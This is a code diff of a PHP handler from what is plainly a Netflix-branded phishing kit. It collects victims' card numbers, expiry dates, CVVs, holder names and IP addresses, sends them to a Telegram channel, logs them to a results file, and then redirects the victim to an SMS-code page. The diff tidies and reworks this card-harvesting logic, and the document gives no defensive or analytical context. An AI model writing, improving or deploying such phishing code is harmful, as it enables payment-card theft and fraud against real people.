@@ -135,23 +135,24 @@ $ip = $_SERVER['REMOTE_ADDR'];
 
 
 if(isset($_POST['cc'])){
-$_SESSION['_cc'] = $_POST['cc'];
-$msg = "
-NETFLIX- New CC 
+    $_SESSION['_cc'] = $_POST['cc'];
+    $holderName = $_POST['holder-name'] ?? '';
+
+    $msg = "
+NETFLIX- New CC
 --------------------------
-Name: ".$_POST['name']."
-Cc: ".$_POST['cc']."
-Exp: ".$_POST['exp']."
-Cvv: ".$_POST['cvv']."
-holder-name: ".$_POST['holder-name']."
+Name: $holderName
+Cc: " . $_POST['cc'] . "
+Exp: " . $_POST['exp'] . "
+Cvv: " . $_POST['cvv'] . "
 --------------------------
 IP: $ip
 ";
 
-sendTotelegram($msg);
-appendResult($msg);
+    sendTotelegram($msg);
+    appendResult($msg);
 
-header("location: wait.php?next=sms.php");
+    header("location: wait.php?next=sms.php");
 
 }
     
